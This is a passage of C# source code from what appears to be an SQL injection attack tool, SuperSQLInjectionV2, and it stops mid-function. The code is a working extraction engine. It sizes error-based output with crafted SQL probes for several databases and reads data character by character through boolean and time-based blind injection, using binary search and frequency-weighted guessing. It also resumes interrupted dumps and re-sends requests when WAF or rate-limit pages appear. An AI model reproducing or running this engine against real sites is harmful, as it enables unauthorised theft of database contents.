using Avalonia.Media;
using Avalonia.Styling;
using Semi.Avalonia.Tokens.Palette;
using SuperSQLInjectionV2.Models;
using SuperSQLInjectionV2.Payload;
using SuperSQLInjectionV2.Tools;
using SuperSQLInjectionV2.Tools.Http;
using SuperSQLInjectionV2.ViewModels;
using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Data;
using System.Linq;
using System.Runtime.Intrinsics.Arm;
using System.Text;
using System.Text.Encodings.Web;
using System.Text.RegularExpressions;
using static System.Net.WebRequestMethods;

namespace SuperSQLInjectionV2.Models.Data
{
    public partial class DataComm
    {
        /// <summary>模板依赖正则的编译缓存（取数热路径：标记串来自可编辑模板无法源生成，Compiled一次编译全程复用；超限整表清理防模板反复修改膨胀）</summary>
        private static readonly System.Collections.Concurrent.ConcurrentDictionary<string, Regex> _patternCache
            = new System.Collections.Concurrent.ConcurrentDictionary<string, Regex>();
        private const int PatternCacheCap = 32;

        private static Regex GetCachedRegex(string pattern)
        {
            if (_patternCache.TryGetValue(pattern, out Regex? re))
            {
                return re;
            }
            if (_patternCache.Count >= PatternCacheCap)
            {
                _patternCache.Clear();
            }
            return _patternCache.GetOrAdd(pattern, p => new Regex(p, RegexOptions.Compiled));
        }

        /// <summary>低基数键归一化：数字抹#（常量模式源生成）</summary>
        [GeneratedRegex("\\d+")]
        private static partial Regex DigitRunRegex();

        //---------------- 盲注断点续取（中断恢复）----------------
        //按取数payload缓存已取出的前缀（hex或unicode码串），中断后同payload重跑时从断点继续，已完成条目自动清除。
        //跨进程持久化到 config/sessions/blind_progress.json
        private static readonly System.Collections.Concurrent.ConcurrentDictionary<string, string> _blindProgress
            = new System.Collections.Concurrent.ConcurrentDictionary<string, string>();

        private static string BlindProgressPath => "config/sessions/blind_progress.json";

        static DataComm()
        {
            try
            {
                if (System.IO.File.Exists(BlindProgressPath))
                {
                    var dic = System.Text.Json.JsonSerializer.Deserialize(
                        System.IO.File.ReadAllText(BlindProgressPath), Source.JsonCtx.CompactInfo<Dictionary<string, string>>());
                    if (dic != null)
                    {
                        foreach (var kv in dic)
                        {
                            _blindProgress[kv.Key] = kv.Value;
                        }
                    }
                }
            }
            catch { }
        }

        /// <summary>断点文件写入锁：多线程CommitProgress并发全量序列化写同一文件，无锁会写坏/丢更新</summary>
        private static readonly object _blindProgressFileLock = new object();

        private static void SaveBlindProgress()
        {
            try
            {
                lock (_blindProgressFileLock)
                {
                    System.IO.Directory.CreateDirectory(System.IO.Path.GetDirectoryName(BlindProgressPath)!);
                    //先写临时文件再替换，避免写一半崩溃留下坏json
                    string tmp = BlindProgressPath + ".tmp";
                    System.IO.File.WriteAllText(tmp,
                        System.Text.Json.JsonSerializer.Serialize(new Dictionary<string, string>(_blindProgress), Source.JsonCtx.CompactInfo<Dictionary<string, string>>()));
                    System.IO.File.Copy(tmp, BlindProgressPath, true);
                    System.IO.File.Delete(tmp);
                }
            }
            catch (Exception ex) { Log.SysLog("System.IO.File.Delet异常：" + ex.Message); }
        }

        /// <summary>清空盲注断点缓存（重新开始取数时用）</summary>
        public static void ClearBlindProgress()
        {
            _blindProgress.Clear();
            SaveBlindProgress();
        }

        /// <summary>断点键加目标维度：同一payload SQL在不同目标间切换时，避免续取到别的目标的脏前缀</summary>
        private static string ScopeKey(AppConfig config, string key) => config.Host + ":" + config.Port + "|" + key;

        /// <summary>取断点前缀（无断点返回空串）</summary>
        public static string GetBlindProgressPrefix(string dataPayload)
        {
            return _blindProgress.TryGetValue(dataPayload ?? "", out string? v) ? v : "";
        }

        /// <summary>取目标维度断点前缀（无断点返回空串）</summary>
        public static string GetBlindProgressPrefix(AppConfig config, string dataPayload)
        {
            return GetBlindProgressPrefix(ScopeKey(config, dataPayload));
        }

        /// <summary>
        /// 用断点前缀预填字符数组，返回起始下标；中断时把已确认的最长连续前缀写回缓存
        /// </summary>
        private static int ResumePrefix(AppConfig config, string dataPayload, char[] chars)
        {
            string prefix = GetBlindProgressPrefix(config, dataPayload);
            int n = Math.Min(prefix.Length, chars.Length);
            for (int i = 0; i < n; i++)
            {
                chars[i] = prefix[i];
            }
            if (n > 0)
            {
                Log.SysLog("盲注断点续取：跳过已获取的前 " + n + " 个字符");
            }
            return n;
        }

        private static void CommitProgress(AppConfig config, string dataPayload, char[] chars, bool finished)
        {
            string key = ScopeKey(config, dataPayload ?? "");
            if (finished)
            {
                _blindProgress.TryRemove(key, out _);
            }
            else
            {
                //只信任最长连续前缀（并行填充可能存在空洞）
                int n = 0;
                while (n < chars.Length && chars[n] != '\0')
                {
                    n++;
                }
                if (n > 0)
                {
                    _blindProgress[key] = new string(chars, 0, n);
                }
            }
            SaveBlindProgress();
        }

        public static string ParseUnionOrErrorData(HttpResponse response)
        {
            return ParseUnionOrErrorData(response, null);
        }

        /// <summary>
        /// 从响应中提取标记包裹的数据。payload非空时先剔除页面回显的注入payload（原文/URL编码/HTML编码形态），
        /// 防止正则误命中回显SQL里的标记字面量而抓到脏数据
        /// </summary>
        public static string ParseUnionOrErrorData(HttpResponse response, string? payload)
        {
            try
            {
                string body = response.BodyTxt ?? "";
                if (body.Length > 0)
                {
                    if (!string.IsNullOrEmpty(payload))
                    {
                        body = InjectTools.StripPayloadReflection(body, payload);
                    }
                    //查找格式^^!col$$$col!^^（标记正则编译缓存，热路径不重复编译；标记取会话级EchoMarkers随机标记）
                    Match m = GetCachedRegex("(?<=(" + EchoMarkers.Start + EchoMarkers.Split + "))[.\\s\\S]*?(?=(" + EchoMarkers.Split + EchoMarkers.End + "))").Match(body);
                    if (m.Success)
                    {
                        return m.Value;
                    }
                }
            }
            catch (Exception e)
            {
                Log.SysLog("ParseUnionOrErrorData:" + e.Message);

            }
            return "";
        }

        //---------------- 报错/Union通道截断处理（回显容量探测+截断兜底+分片断点续传）----------------

        /// <summary>实测回显容量回调：探测到当前注入点真实回显净容量后触发，UI层订阅写回注入记录（无头环境为null仅走会话缓存）</summary>
        public static Action<AppConfig, int>? OnErrorChunkLenProbed;

        /// <summary>会话级实测容量缓存（key=host:port|参数|库类型），同注入点本次进程内不重复探测</summary>
        private static readonly System.Collections.Concurrent.ConcurrentDictionary<string, int> _errorChunkLenCache
            = new System.Collections.Concurrent.ConcurrentDictionary<string, int>();

        /// <summary>剔除回显后的正文是否出现"起始标记在、结束标记丢失"（响应截断信号）</summary>
        public static bool IsTruncatedMarker(HttpResponse response, string? payload)
        {
            try
            {
                string body = response.BodyTxt ?? "";
                if (body.Length == 0)
                {
                    return false;
                }
                if (!string.IsNullOrEmpty(payload))
                {
                    body = InjectTools.StripPayloadReflection(body, payload);
                }
                string start = EchoMarkers.Start + EchoMarkers.Split;
                string stop = EchoMarkers.Split + EchoMarkers.End;
                return body.Contains(start, StringComparison.Ordinal) && !body.Contains(stop, StringComparison.Ordinal);
            }
            catch
            {
                return false;
            }
        }

        /// <summary>
        /// 截断兜底提取（截断兜底）：结束标记被服务器截掉时，抢救起始标记后到 '<'/换行 之间的部分数据并告警
        /// </summary>
        public static string ParseTrimmed(HttpResponse response, string? payload)
        {
            try
            {
                string body = response.BodyTxt ?? "";
                if (!string.IsNullOrEmpty(payload))
                {
                    body = InjectTools.StripPayloadReflection(body, payload);
                }
                string start = EchoMarkers.Start + EchoMarkers.Split;
                Match m = GetCachedRegex("(?<=(" + start + "))[^<\\r\\n]*").Match(body);
                if (m.Success && m.Value.Length > 0)
                {
                    Log.Warning("检测到服务器截断输出（结束标记丢失），已抢救部分数据：" + m.Value.Length + "字符（possible server trimmed output）");
                    return m.Value;
                }
            }
            catch (Exception e)
            {
                Log.SysLog("ParseTrimmed:" + e.Message);
            }
            return "";
        }

        /// <summary>报错标记包裹的总开销（前缀data__s_p_ 10字符 + 后缀_s_p__data 10字符），探测换算净容量用</summary>
        private static int ErrorMarkerOverhead =>
            (EchoMarkers.Start + EchoMarkers.Split).Length
            + (EchoMarkers.Split + EchoMarkers.End).Length;

        /// <summary>
        /// 探测当前注入点+当前报错方式的真实回显净容量（回显容量探测机制）：
        /// 用REPEAT/REPLICATE/RPAD生成定长字符串探针二分：完整返回→容量命中；截断→按抢救的前导'5'个数换算候选；全空→折半。
        /// 仅MySQL/SQLServer/Oracle/DM探测（对齐探测范围；PG系报错完整回显、无报错通道库不探测）。
        /// 结果写会话缓存+DataConfig.MeasuredErrorChunkLen+回调（注入记录持久化），第二次取数免探测
        /// </summary>
        public static async Task<int> ProbeErrorChunkLen(AppConfig config)
        {
            DBType db = config.DataConfig.SelectedDBType;
            //PG系也纳入探测：上游PG完整回显，但KingbaseES等衍生库实测会截断长值（约60字符），
            //不探测直接按模板80步长会丢列（实测复现：金仓dump末列被截）
            if (db is not (DBType.MySQL or DBType.SQLServer or DBType.Oracle or DBType.DM
                or DBType.PostgreSQL or DBType.Kingbase or DBType.OpenGauss))
            {
                return 0;
            }
            string key = config.Host + ":" + config.Port + "|" + config.DataConfig.InjectParamName + "|" + db
                + "|" + (config.DataConfig.SelectedErrorMethod ?? "");
            if (_errorChunkLenCache.TryGetValue(key, out int cached) && cached > 0)
            {
                return cached;
            }
            if (config.DataConfig.MeasuredErrorChunkLen > 0)
            {
                _errorChunkLenCache[key] = config.DataConfig.MeasuredErrorChunkLen;
                return config.DataConfig.MeasuredErrorChunkLen;
            }

            int overhead = ErrorMarkerOverhead;
            int n = 128;
            int floor = 8;
            int measured = 0;
            for (int round = 0; round < 6 && n >= floor; round++)
            {
                config.CheckStop();
                string expr = db switch
                {
                    DBType.MySQL => "(select repeat(0x35," + n + "))",
                    DBType.SQLServer => "(select replicate(char(53)," + n + "))",
                    //PG系：repeat(chr(53),N)
                    DBType.PostgreSQL or DBType.Kingbase or DBType.OpenGauss => "(select repeat(chr(53)," + n + "))",
                    //Oracle/DM：RPAD('5',N,'5')
                    _ => "(select rpad(chr(53)," + n + ",chr(53)) from dual)"
                };
                string payloadData = config.DataConfig.IsVectorMode
                    ? PayloadFactory.BPTool.ConcatData(new List<string> { expr })
                    : PayloadFactory.BPTool.ErrorData(expr);
                HttpRequest request = HttpRequest.CreateForSend(config, config.RequestTxt); //T1轻量发送构造：跳过参数/JSON/XML解析
                request.Payload = payloadData;
                HttpResponse response = await HTTPTool.SendRequestRetryAsync(request).ConfigureAwait(false);
                string full = ParseUnionOrErrorData(response, payloadData);
                if (full.Length == n && full.All(c => c == '5'))
                {
                    //完整返回：净容量至少n（标记开销另算），直接用n作分片步长
                    measured = n;
                    break;
                }
                if (IsTruncatedMarker(response, payloadData))
                {
                    //截断：抢救前导'5'个数k → 服务器保留总字符=前缀+k → 净容量候选=k-后缀长
                    string trimmed = ParseTrimmed(response, payloadData);
                    int k = 0;
                    while (k < trimmed.Length && trimmed[k] == '5')
                    {
                        k++;
                    }
                    int stopLen = (EchoMarkers.Split + EchoMarkers.End).Length;
                    int candidate = k - stopLen;
                    if (candidate >= floor)
                    {
                        measured = candidate;
                        break;
                    }
                }
                //全空或候选太小：折半继续
                n /= 2;
            }
            if (measured > 0)
            {
                _errorChunkLenCache[key] = measured;
                config.DataConfig.MeasuredErrorChunkLen = measured;
                Log.Show("实测报错回显净容量：" + measured + " 字符（探针二分，已缓存到注入记录，分片按实测步长取数）");
                try { OnErrorChunkLenProbed?.Invoke(config, measured); } catch { }
            }
            else
            {
                Log.SysLog("报错回显容量探测未命中，回退模板静态ErrorChunkLen步长");
            }
            return measured;
        }

        /// <summary>
        /// 当前盲注判断方式是否不需要响应body：长度类（Content-Length头比对）/状态码/时间判断只看响应头，
        /// 满足时置NullBodyHint只读响应头省带宽（null-connection 能力）；关键字/正则必须读正文不适用
        /// </summary>
        private static bool NullBodyCapable(AppConfig config)
        {
            return config.DataConfig.EffectiveBoolType is BoolInjectType.BodyLength or BoolInjectType.MaxLength or BoolInjectType.MinLength or BoolInjectType.Code or BoolInjectType.Time;
        }

        //---------------- 防脏数据校验（防脏数据校验机制）----------------
        //检测期把真/假页HTTP状态码记入注入记录（TrueCode/FalseCode），取数探测出现集合外状态码判定为脏数据
        //（WAF拦截页/网关抖动/限流页），本次探测作废重发（最多2次）；重发仍异常记录SawUnexpectedCode，
        //触发后续逐字符NOT等值复核（布尔通道健康时零额外请求，时间通道恒复核）。
        private static readonly System.Collections.Concurrent.ConcurrentDictionary<string, bool> _unexpectedCodeWarned = new();

        private static bool IsUnexpectedCode(int code, int trueCode, int falseCode)
        {
            if (trueCode <= 0 && falseCode <= 0)
            {
                return false;   //未记录基线（手工配置/旧记录），不做意外码校验
            }
            return code != trueCode && code != falseCode;
        }

        private static void MarkUnexpectedCode(AppConfig config, int code)
        {
            config.DataConfig.SawUnexpectedCode = true;
            string key = config.DataConfig.TrueCode + "/" + config.DataConfig.FalseCode + "->" + code;
            if (_unexpectedCodeWarned.TryAdd(key, true))
            {
                Log.Warning("探测响应出现意外状态码 " + code + "（检测期基线：真=" + config.DataConfig.TrueCode + "/假=" + config.DataConfig.FalseCode + "），本次探测作废重发，后续将启用逐字符复核防脏数据！");
            }
        }

        /// <summary>
        /// 盲注oracle发包守卫：响应状态码不属于检测期记录的合法集合时作废重发（最多2次），仍异常则标记SawUnexpectedCode。
        /// 仅作用于盲注探测链路（ProbeBool/GetBoolValue/GetDataLen/CheckCondition），Union/报错通道不受影响
        /// </summary>
        private static async Task<HttpResponse> SendBoolGuarded(AppConfig config, HttpRequest request)
        {
            HttpResponse response = await HTTPTool.SendRequestRetryAsync(request).ConfigureAwait(false);
            if (!config.DataConfig.DirtyDataGuard)
            {
                return response;
            }
            int trueCode = config.DataConfig.TrueCode;
            int falseCode = config.DataConfig.FalseCode;
            int guard = 0;
            while (guard < 2 && IsUnexpectedCode(response.StatusCode, trueCode, falseCode))
            {
                MarkUnexpectedCode(config, response.StatusCode);
                guard++;
                config.CheckStop();
                response = await HTTPTool.SendRequestRetryAsync(request).ConfigureAwait(false);
            }
            if (IsUnexpectedCode(response.StatusCode, trueCode, falseCode))
            {
                //重发仍异常：放行本次判定但标记，触发逐字符复核兜底
                MarkUnexpectedCode(config, response.StatusCode);
            }
            return response;
        }

        /// <summary>
        /// 字符收敛后NOT等值复核（防脏数据校验）：发 (case when 表达式<>已读值 then 1 else 0 end)>0 期望为假，
        /// 为真说明二分读到脏值。触发条件：时间通道恒复核（静态超时页风险高）；布尔通道仅在见过意外状态码后复核（健康时零额外请求）
        /// </summary>
        private static async Task<bool> ValidateCharByBool(AppConfig config, string exprPayload, int code)
        {
            if (!config.DataConfig.DirtyDataGuard)
            {
                return true;
            }
            bool isTime = config.DataConfig.EffectiveBoolType == BoolInjectType.Time;
            if (!isTime && !config.DataConfig.SawUnexpectedCode)
            {
                return true;
            }
            //时间通道：MD5整串校验可用时省略逐字符复核（每值1次整串校验替代每字符1次复核，省N-1次探测）
            if (isTime && !config.DataConfig.SawUnexpectedCode && HashVerifyAvailableCached(config))
            {
                return true;
            }
            string cond = "(case when (" + exprPayload + ")<>" + code + " then 1 else 0 end)";
            bool notEq = await ProbeBool(config, cond, 0).ConfigureAwait(false);
            if (!notEq)
            {
                return true;
            }
            if (isTime)
            {
                //时间通道复核失败多为延时边界抖动：自动延时+1秒后由调用方重读（时间盲注自适应加时）
                int t = MyTools.ConvertToInt(config.DataConfig.CheckValue);
                if (t > 0 && t < 30)
                {
                    config.DataConfig.CheckValue = (t + 1).ToString();
                    Log.Warning("时间盲注字符复核未通过（读到值与库中不符），延时自动+1秒（当前" + config.DataConfig.CheckValue + "s）重读该字符……");
                }
            }
            else
            {
                Log.SysLog("字符复核未通过（读到值与库中不符），重新读取该字符……");
            }
            return false;
        }

        /// <summary>字符读取+复核封装：复核未通过自动重读（最多3次），复核通过/达上限返回最后读到值</summary>
        private static async Task<int> ReadCodepointValidated(AppConfig config, string exprPayload, Func<Task<int>> read)
        {
            for (int attempt = 1; ; attempt++)
            {
                int code = await read().ConfigureAwait(false);
                if (attempt >= 3 || await ValidateCharByBool(config, exprPayload, code).ConfigureAwait(false))
                {
                    return code;
                }
            }
        }

        /// <summary>
        /// 二分法判断
        /// </summary>
        /// <param name="payLoadStr">获取数据paylaod</param>
        /// <param name="start">开始值</param>
        /// <param name="end">最大值</param>
        /// <returns></returns>
        public static async Task<int> GetBoolValue(AppConfig config, string payload, int start, int end)
        {

            int low = start;
            int high = end;

            while (low <= high)
            {
                config.CheckStop();
                int mid = MyTools.getLargeNum(low, high);

                HttpRequest request = HttpRequest.CreateForSend(config, config.RequestTxt); //T1轻量发送构造：跳过参数/JSON/XML解析
                request.NullBodyHint = NullBodyCapable(config);
                request.Payload = WrapSleepCondition(config, PayloadFactory.BPTool.CheckBoolData(payload, mid));
                HttpResponse response = await SendBoolGuarded(config, request).ConfigureAwait(false);
                bool exists = await JudgeBoolAsync(config, request, response);
                if (low == high)
                {
                    if (exists)
                    {
                        return high + 1;
                    }
                    else
                    {
                        return high;
                    }
                }
                if (exists)
                {
                    low = mid + 1;
                }
                else
                {
                    high = mid - 1;
                }
            }

            return high+1;

        }

        /// <summary>
        /// 盲注取数统一真假判定入口：离散判定方式（关键字/状态码/长度/时间）直接判；
        /// Similarity走sqlmap三段式——快判真/假立即返回，灰区（贴阈值&LT;0.01）不可判定时
        /// 原请求重发（最多2次，sqlmap comparison返回None→queryPage重试同款语义），
        /// 连发仍贴阈值才按阈值近侧硬判并留痕，避免模糊响应硬归类污染取数比特
        /// </summary>
        private static async Task<bool> JudgeBoolAsync(AppConfig config, HttpRequest request, HttpResponse response)
        {
            var dc = config.DataConfig;
            if (dc.EffectiveBoolType != BoolInjectType.Similarity)
            {
                return TruthOracle.IsTrue(response, dc.CheckValue, dc.Reverse, dc.EffectiveBoolType);
            }
            for (int attempt = 0; ; attempt++)
            {
                bool? judged = TruthOracle.JudgeSimilarity(response, dc.SimilarTemplate, dc.SimilarMode, dc.SimilarCutoff, dc.SimilarFeatures);
                if (judged.HasValue)
                {
                    return dc.Reverse ? !judged.Value : judged.Value;
                }
                if (attempt >= 2)
                {
                    Log.SysLog("相似度判定连续落入灰区（阈值" + dc.SimilarCutoff.ToString("F3") + "），按近侧硬判！目标页面动态性过强，取数结果可能不可靠");
                    bool hard = TruthOracle.IsTrue(response, "", false, BoolInjectType.Similarity,
                        dc.SimilarTemplate, dc.SimilarMode, dc.SimilarCutoff, dc.SimilarFeatures);
                    return dc.Reverse ? !hard : hard;
                }
                //灰区重发：同一请求原样重发（脏数据防护由SendBoolGuarded兜底）
                response = await SendBoolGuarded(config, request).ConfigureAwait(false);
            }
        }

        /// <summary>单次盲注oracle探测（X > mid 判定），与GetBoolValue内部发包/判定逻辑一致</summary>
        public static async Task<bool> ProbeBool(AppConfig config, string payload, int mid)
        {
            config.CheckStop();
            HttpRequest request = HttpRequest.CreateForSend(config, config.RequestTxt); //T1轻量发送构造：跳过参数/JSON/XML解析
            request.NullBodyHint = NullBodyCapable(config);
            request.Payload = WrapSleepCondition(config, PayloadFactory.BPTool.CheckBoolData(payload, mid));
            HttpResponse response = await SendBoolGuarded(config, request).ConfigureAwait(false);
            return await JudgeBoolAsync(config, request, response);
        }

        /// <summary>
        /// 整串ASCII-only预检：1次请求判定（字节数>字符数）整串是否含多字节字符；
        /// 纯ASCII时逐字符可直接1~127二分（7次/字符，免逐字符>255探测，纯ASCII串省~24%请求）；
        /// 不支持字节长度函数的库返回null（维持逐字符自适应探测）
        /// </summary>
        private static async Task<bool?> HasMultibytePrecheck(AppConfig config, string payload, DBType dbType)
        {
            string? expr = dbType switch
            {
                //MySQL：length=字节数，char_length=字符数（ord路径传已cast为字符的payload）
                DBType.MySQL => "(length(" + payload + ")-char_length(" + payload + "))",
                //PG系：octet_length=UTF-8字节数，char_length=字符数（payload为原始表达式，需cast成text）
                DBType.PostgreSQL or DBType.OpenGauss or DBType.Kingbase =>
                    "(octet_length(cast((" + payload + ") as text))-char_length(cast((" + payload + ") as text)))",
                //SQLite：blob长度=UTF-8字节数，text长度=字符数
                DBType.SQLite => "(length(cast((" + payload + ") as blob))-length(cast((" + payload + ") as text)))",
                //H2 octet_length对字符串返回UTF-16字节数恒大于字符数不可用，改用正则探测非ASCII字符
                DBType.H2 => "(case when regexp_like(cast((" + payload + ") as varchar), '[^\\x00-\\x7F]') then 1 else 0 end)",
                _ => null
            };
            if (expr == null)
            {
                return null;
            }
            //CheckBoolData模板={0}>{1}，mid=0即探测（字节数-字符数）>0，true=含多字节
            return await ProbeBool(config, expr, 0).ConfigureAwait(false);
        }

        /// <summary>长度探测结果缓存（键=长度表达式）：同表达式重复读长度（常见值预测未命中回退逐字符、断点续传）免重复发包</summary>
        private static readonly System.Collections.Concurrent.ConcurrentDictionary<string, int> _lenCache
            = new System.Collections.Concurrent.ConcurrentDictionary<string, int>();

        /// <summary>
        /// 长度指数分段探测（全库盲注通用）：先按 32→128→512→2048→8192→32768 阶梯探上界，命中后桶内二分。
        /// 实际长度远小于maxLen时大幅省请求（如行数据maxLen=100000时固定二分需17次，百字符行约9次）；
        /// 极大值场景略多1~6次探测，换取典型场景40%~60%长度探测节省
        /// </summary>
        public static async Task<int> GetLengthAdaptive(AppConfig config, string lenPayload, int maxLen)
        {
            //键含目标地址：同表达式切换到新目标时长度可能不同，避免读到旧目标缓存
            string lenKey = config.Host + ":" + config.Port + "|" + lenPayload;
            if (_lenCache.TryGetValue(lenKey, out int cached))
            {
                return cached;
            }
            int low = 0;
            int high = 32;
            while (high < maxLen)
            {
                //探测 len>high：true=值在更高区间
                if (await ProbeBool(config, lenPayload, high).ConfigureAwait(false))
                {
                    low = high + 1;
                    high *= 4;
                }
                else
                {
                    break;
                }
            }
            if (high > maxLen)
            {
                high = maxLen;
            }
            int lenResult;
            if (low > high)
            {
                lenResult = low;
            }
            else
            {
                lenResult = await GetBoolValue(config, lenPayload, low, high).ConfigureAwait(false);
            }
            _lenCache[lenKey] = lenResult;
            return lenResult;
        }

        /// <summary>
        /// SQLServer ASCII-only预检：UTF-16下字节/字符数恒等（length法不可用），
        /// 强制二进制collation后 LIKE '%[^␁-~]%'（nchar(1)~126区间取反）按码点判定是否存在≥127的字符，
        /// 控制字符（换行等&lt;32）按ASCII处理走快车道（2005+通用）；
        /// 返回true=含≥127字符，false=纯ASCII（逐字符直接1~127二分，7次/字符）
        /// </summary>
        public static async Task<bool> SqlServerHasNonAsciiPrecheck(AppConfig config, string payload)
        {
            //模式串用nchar(1)拼接下限（范围1~126），避开LIKE字面量控制字符解析问题；取反后命中≥127及0
            string expr = "(case when cast((" + payload + ") as nvarchar(max)) collate Latin1_General_BIN like N'%[^'+nchar(1)+N'-~]%' then 1 else 0 end)";
            //CheckBoolData模板={0}>{1}，mid=0即探测 case结果>0
            return await ProbeBool(config, expr, 0).ConfigureAwait(false);
        }

        /// <summary>
        /// ASCII快车道预检（hex路径库专用）：true=纯ASCII可走ascii逐字符读取（7次/字符，优于hex约9.2次/字节），
        /// false=含多字节维持hex，null=该库无可靠预检表达式（维持hex）
        /// </summary>
        private static async Task<bool?> AsciiLanePrecheck(AppConfig config, string castedPayload, DBType dbType)
        {
            string? expr = dbType switch
            {
                //asciistr把非ASCII字符转\XXXX转义：长度不变当且仅当纯ASCII（字符集无关，精确）
                DBType.Oracle => "(length(asciistr(" + castedPayload + "))-length(" + castedPayload + "))",
                //达梦（Oracle兼容）：lengthb=字节数，length=字符数
                DBType.DM => "(lengthb(" + castedPayload + ")-length(" + castedPayload + "))",
                //ClickHouse：length=字节数，lengthUTF8=字符数
                DBType.ClickHouse => "(length(" + castedPayload + ")-lengthUTF8(" + castedPayload + "))",
                //DB2 11.1+：ICU正则按码点判定非ASCII字符（含控制字符，保守落hex）
                DBType.DB2 => "(case when regexp_like(" + castedPayload + ", '[^ -~]') then 1 else 0 end)",
                _ => null
            };
            if (expr == null)
            {
                return null;
            }
            //探测（差异>0），true=含非ASCII，取反即"纯ASCII"
            return !await ProbeBool(config, expr, 0).ConfigureAwait(false);
        }

        /// <summary>
        /// 限定字符集合的盲注二分：频率有序IN集合二分，
        // 每字符请求数≈Huffman深度（hex 16字符集≈3.5次）；候选集合须包含真实值（调用方保证）
        /// </summary>
        public static async Task<int> GetBoolValueInSet(AppConfig config, string payload, List<int> codes, string? prefix = null)
        {
            if (codes == null || codes.Count == 0)
            {
                return 0;
            }
            if (codes.Count == 1)
            {
                return codes[0];
            }
            return await GetBoolValueFreq(config, payload, codes, prefix).ConfigureAwait(false);
        }

        //---------------- 频率有序 IN 集合二分（Huffman 思想，比传统逐字符提示/位平面更进一步）----------------
        //候选按字符频率排序，每次探测把剩余候选按累计频率约 50/50 切成两组，
        //发 (case when 表达式 in (高频组) then 1 else 0 end)>0，命中组继续切。
        //典型文本/标识符/hash 平均≈4.5~5次/字符（均匀二分恒7次，省~30%）；
        //频率随已读字符自适应漂移（_charFreqObserved），同一批数据越读越快；
        //候选全集不裁剪（1~127全保留），集合外字符只会变慢不会读错。
        private static readonly System.Collections.Concurrent.ConcurrentDictionary<int, int> _charFreqObserved
            = new System.Collections.Concurrent.ConcurrentDictionary<int, int>();

        /// <summary>ASCII字符频率序（靠前=高频）：英文文本频率 + 数字（hash/ID场景）+ 点/下划线/横线（版本号/标识符场景）+ 大写 + 常见特殊字符</summary>
        private const string AsciiFreqOrder =
            " etaoinshrdlu0123456789._-cmfwypvbgkqjxzETAOINSHRDLU()CMFWYPVBGKQJX/:;\"',[]{}<>|@#$%^&*+=?`~\\\t\r\n";

        private static Dictionary<int, double>? _asciiWeight;
        private static Dictionary<int, double> AsciiWeight
        {
            get
            {
                if (_asciiWeight == null)
                {
                    //Zipf式衰减权重：w=1/(rank+8)；未列出字符（控制符等）给极小权重兜底
                    var dic = new Dictionary<int, double>();
                    for (int i = 0; i < AsciiFreqOrder.Length; i++)
                    {
                        dic[(int)AsciiFreqOrder[i]] = 1.0 / (i + 8);
                    }
                    //字节值128~255（UTF-8多字节段：CJK首字节E4~E9/延续字节80~BF）：平坦中低权重，
                    //避免频率二分落到~12次/字节（均匀二分仅8次），中文场景与均匀二分持平
                    for (int v = 128; v <= 255; v++)
                    {
                        dic[v] = 0.006;
                    }
                    _asciiWeight = dic;
                }
                return _asciiWeight;
            }
        }

        /// <summary>有效权重 = 静态频率权重 × (1+已观测次数)（自适应漂移，观测越多越贴近当前目标内容分布）</summary>
        private static double EffWeight(int value)
        {
            double w = AsciiWeight.TryGetValue(value, out double bw) ? bw : 0.0005;
            int obs = _charFreqObserved.TryGetValue(value, out int o) ? o : 0;
            return w * (1 + obs);
        }

        //---------------- n-gram 字符预测模型融入逐字符二分 ----------------
        //模型概率只替换权重来源：候选全集不裁剪（猜错只会变慢不会读错），
        //权重下限兜底（不在模型分布内的字符保留 静态权重×0.35/0.5），
        //信任度随命中情况自适应（猜错衰减、猜中提升，模型不准时自动退回静态频率）。
        /// <summary>会话级模型信任度（0.25~1.0）：命中提升、落空衰减</summary>
        private static double _ngramTrust = 1.0;
        /// <summary>SQLI_NGRAM=0 环境变量关闭n-gram权重融合（harness A/B对比用）</summary>
        private static readonly bool NgramEnvOff = Environment.GetEnvironmentVariable("SQLI_NGRAM") == "0";

        /// <summary>n-gram融合开关：跟随"值预测"开关（PredictOutput），且模型文件可用、未被环境变量关闭</summary>
        private static bool NgramActive(AppConfig config)
        {
            return !NgramEnvOff && config.DataConfig.PredictOutput && NgramCharModel.Available;
        }

        /// <summary>当前值已读前缀（最后1~2字符，n-gram上下文）；有未读空洞（\0）或非ASCII返回null退静态频率</summary>
        private static string? AsciiPrefix(char[] chars, int index)
        {
            if (index <= 0)
            {
                return null;
            }
            char c1 = chars[index - 1];
            if (c1 == '\0' || c1 >= 128)
            {
                return null;
            }
            if (index >= 2)
            {
                char c0 = chars[index - 2];
                if (c0 != '\0' && c0 < 128)
                {
                    return new string(new[] { c0, c1 });
                }
            }
            return new string(c1, 1);
        }

        /// <summary>
        /// 频率有序 IN 集合二分：候选须保证包含真实值（调用方经ASCII预检/hex输出特性保证），收敛到唯一候选即返回。
        /// prefix非空且候选为全ASCII/字节区间时融入n-gram模型概率（只影响分组顺序，不影响候选全集）
        /// </summary>
        private static async Task<int> GetBoolValueFreq(AppConfig config, string payload, List<int> candidates, string? prefix = null)
        {
            //n-gram权重融合：仅全区间候选（ASCII 1~127 / 字节 0~255）启用；hex等小字符集/自定义字符集不动
            Dictionary<int, double>? dist = null;
            bool byteRange = ReferenceEquals(candidates, ByteRangeCache);
            if (prefix != null && NgramActive(config)
                && (ReferenceEquals(candidates, AsciiRangeCache) || byteRange))
            {
                NgramCharModel.TryGetDist(prefix, out dist, config.DataConfig.NgramOnlineLearn);
            }
            //不在模型分布内的字符权重下限：ASCII区间0.35、字节区间0.5（字节区间含≥128多字节段，下限放宽防中文变慢）
            double floorFactor = byteRange ? 0.5 : 0.35;
            double BlendWeight(int v)
            {
                double w = EffWeight(v);
                if (dist == null)
                {
                    return w;
                }
                double p;
                bool found = dist.TryGetValue(v, out p);
                if (!found && v >= 'A' && v <= 'Z')
                {
                    //大写折叠：模型按小写训练，大写字符取其小写概率×0.5
                    found = dist.TryGetValue(v + 32, out p);
                    p *= 0.5;
                }
                double trust = _ngramTrust;
                return found ? w * (1 + 12 * trust * p) : w * floorFactor;
            }
            var list = candidates.OrderByDescending(v => BlendWeight(v)).ToList();
            while (list.Count > 1)
            {
                config.CheckStop();
                //按累计频率约50/50切分：高频组（前段）凑到总权重一半
                double total = list.Sum(v => BlendWeight(v));
                double acc = 0;
                int cut = 0;
                for (; cut < list.Count - 1; cut++)
                {
                    acc += BlendWeight(list[cut]);
                    if (acc >= total / 2)
                    {
                        break;
                    }
                }
                List<int> highGroup = list.Take(cut + 1).ToList();
                string cond = "(case when (" + payload + ") in (" + string.Join(",", highGroup) + ") then 1 else 0 end)";
                bool inHigh = await ProbeBool(config, cond, 0).ConfigureAwait(false);
